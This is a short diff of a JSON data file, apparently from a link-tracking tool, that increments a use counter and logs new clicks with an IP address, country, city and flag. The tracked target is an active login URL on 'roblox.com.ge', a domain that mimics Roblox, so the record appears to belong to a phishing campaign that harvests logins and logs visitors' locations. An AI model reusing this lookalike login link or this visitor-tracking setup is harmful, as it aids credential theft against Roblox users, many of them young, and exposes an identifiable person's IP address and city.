@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1114,
+    "useCount": 1115,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9051,6 +9051,14 @@
       },
       {
         "timestamp": 1777269616215,
+        "ip": "122.2.64.135",
+        "country": "Philippines",
+        "city": "Marikina City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777269727052,
         "ip": "122.2.64.135",
         "country": "Philippines",
         "city": "Marikina City",
